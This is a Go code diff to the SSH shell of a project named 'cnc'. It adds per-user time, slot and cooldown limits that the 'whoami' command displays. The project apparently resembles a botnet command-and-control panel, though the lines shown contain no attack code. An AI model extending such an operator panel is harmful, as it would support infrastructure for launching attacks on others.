@@ -2,11 +2,13 @@ package shell
 
 import (
 	"io"
+	"strconv"
 	"strings"
 
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/term"
 
+	"github.com/malasahjagotwin/cnc/internal/auth"
 	"github.com/malasahjagotwin/cnc/internal/prompt"
 )
 
@@ -22,19 +24,25 @@ type Session struct {
 	theme    prompt.Theme
 	username string
 	hostname string
+	time     string
+	slot     int
+	cooldown int
 	prompt   string
 	commands map[string]Command
 }
 
-func New(channel ssh.Channel, theme prompt.Theme, username, hostname string) *Session {
+func New(channel ssh.Channel, theme prompt.Theme, user auth.User, hostname string) *Session {
 	t := term.NewTerminal(channel, "")
 	s := &Session{
 		channel:  channel,
 		term:     t,
 		theme:    theme,
-		username: username,
+		username: user.Username,
 		hostname: hostname,
-		prompt:   theme.Build(username, hostname),
+		time:     user.Time,
+		slot:     user.Slot,
+		cooldown: user.Cooldown,
+		prompt:   theme.Build(user.Username, hostname),
 	}
 	s.commands = commandRegistry()
 	return s
@@ -85,6 +93,9 @@ func commandRegistry() map[string]Command {
 		"help": {Name: "help", Help: "tampilkan daftar perintah", Run: cmdHelp},
 		"whoami": {Name: "whoami", Help: "tampilkan user saat ini", Run: func(s *Session, _ []string) bool {
 			s.print(s.theme.Gradient(s.username))
+			s.print("Time     : " + s.time + "s")
+			s.print("Slot     : " + strconv.Itoa(s.slot))
+			s.print("Cooldown : " + strconv.Itoa(s.cooldown) + "s")
 			return false
 		}},
 		"clear": {Name: "clear", Help: "bersihkan layar", Run: func(s *Session, _ []string) bool {
